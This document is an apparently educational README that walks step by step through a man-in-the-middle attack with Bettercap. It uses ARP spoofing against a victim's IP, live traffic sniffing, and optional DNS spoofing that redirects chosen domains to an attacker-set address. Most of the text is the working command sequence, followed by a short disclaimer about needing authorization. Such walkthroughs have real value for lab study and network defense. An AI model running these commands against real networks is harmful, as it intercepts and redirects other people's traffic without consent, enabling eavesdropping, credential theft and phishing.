# ARP Spoofing using Bettercap for MITM Attack

## Overview

This project demonstrates how to perform a Man-in-the-Middle (MITM) attack using **Bettercap** through ARP spoofing. The goal is to intercept and manipulate network traffic between a victim device and the router. This attack showcases how ARP spoofing can be used for network sniffing and DNS spoofing.

## Tools and Technologies

- **Bettercap**: A powerful, flexible tool for network monitoring and attacks.
- **ARP Spoofing**: Redirect network traffic by pretending to be the router or another device in the network.
- **DNS Spoofing**: Redirect specific domain requests to a designated IP address.
- **Network Sniffing**: Capturing and viewing real-time network traffic.

## Steps to Perform ARP Spoofing with Bettercap

1. **Install Bettercap**: Make sure Bettercap is installed on your system.

   ```bash
   sudo apt install bettercap
   ```

2. **Start Bettercap**: Launch Bettercap’s command-line interface (CLI).

   ```bash
   sudo bettercap
   ```

3. **Discover Devices in the Network**:

   - Turn on network probing to find devices on the network.

   ```bash
   net.probe on
   ```

   - View the discovered devices.

   ```bash
   net.show
   ```

4. **Enable Full Duplex Mode for ARP Spoofing**:

   - Enable full-duplex ARP spoofing to act as a relay between the victim and the router.

   ```bash
   set arp.spoof.fullduplex true
   ```

5. **Set Target Device**:

   - Set the victim’s IP address as the target (replace `192.168.1.7` with the target's IP address).

   ```bash
   set arp.spoof.targets 192.168.1.7
   ```

6. **Activate ARP Spoofing**:

   - Begin ARP spoofing to intercept network traffic.

   ```bash
   arp.spoof on
   ```

7. **View Real-Time Network Traffic**:
   - Enable network sniffing to monitor live traffic.
   ```bash
   net.sniff on
   ```

## DNS Spoofing (Optional)

If you want to redirect the victim’s traffic to a specific IP address, you can perform DNS spoofing as well.

1. **Set DNS Spoofing Address**:

   - Redirect DNS queries to the desired IP address (replace `<IP>` with the target IP).

   ```bash
   set dns.spoof.address <IP>
   ```

2. **Set Domains for Spoofing**:

   - Specify which domain(s) to spoof (e.g., `example.com`).

   ```bash
   set dns.spoof.domains <URL>
   ```

3. **Activate DNS Spoofing**:
   ```bash
   dns.spoof on
   ```

## Disclaimer

This project is for educational purposes only. Unauthorized use of ARP or DNS spoofing may be illegal and is not permitted without explicit permission. Always ensure you have the proper authorization before conducting such tests.

## References

- [Bettercap Documentation](https://www.bettercap.org/docs/)
- [ARP Spoofing Explained](https://www.varonis.com/blog/arp-spoofing)
